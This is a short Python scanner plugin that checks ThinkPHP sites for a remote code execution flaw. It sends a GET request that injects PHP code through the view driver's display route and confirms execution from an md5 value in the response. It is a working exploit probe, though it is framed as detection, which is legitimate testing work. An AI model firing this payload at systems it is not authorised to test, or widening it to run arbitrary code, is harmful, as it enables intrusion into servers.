"""  
@Time: 2024/2/28 16:08 
@Auth: Y5neKO
@File: Thinkphp_driver_display_rce.py 
@IDE: PyCharm 
"""
import urllib
import requests


def run(url, timeout):
    result = {
        'name': 'Thinkphp_driver_display_rce',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    try:
        vurl = urllib.parse.urljoin(url,
                                    'index.php?s=index/\\think\\view\driver\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = url
            result['payload'] = vurl
    except Exception as e:
        print(f"发生错误：{e}")

    return result
